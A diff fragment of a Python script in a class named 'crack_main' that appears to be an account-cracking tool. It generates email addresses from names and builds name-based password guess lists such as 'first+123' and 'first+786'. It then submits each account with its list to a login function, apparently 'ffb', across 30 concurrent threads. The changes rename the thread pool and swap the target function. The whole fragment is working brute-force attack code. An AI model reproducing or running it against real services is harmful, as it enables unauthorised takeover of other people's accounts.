@@ -441,7 +441,7 @@ class crack_main():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('mail.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as Aking:
+                with ThreadPool(max_workers=30) as formSubmit:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -457,7 +457,7 @@ class crack_main():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Aking.submit(rndm,ids,passlist)
+                                formSubmit.submit(self.ffb,iid,name,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
